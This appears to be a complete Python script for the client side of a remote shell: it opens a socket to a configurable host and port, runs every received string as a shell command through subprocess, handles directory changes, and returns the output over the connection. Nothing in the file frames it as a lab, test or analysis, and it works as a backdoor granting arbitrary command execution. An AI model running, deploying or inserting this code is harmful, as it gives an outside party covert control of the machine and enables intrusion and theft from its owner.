import os
import socket
import subprocess

class Client(object):
    def __init__(self, host='127.0.0.1', port=9999):
        self.host = host
        self.port = port
        self.sock = socket.socket()

    def connect(self):
        self.sock.connect((self.host, self.port))

    def run(self):
        while True:
            data = self.sock.recv(1024)
            if data[:2].decode("utf-8") == "cd":
                os.chdir(data[3:].decode("utf-8"))
            if len(data) > 0:
                cmd = subprocess.Popen(
                    data.decode("utf-8"),
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE
                    )
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                self.sock.send(str.encode(output_str))
                print(output_str)

def main():
    c = Client()
    c.connect()
    c.run()

if __name__ == "__main__":
    main()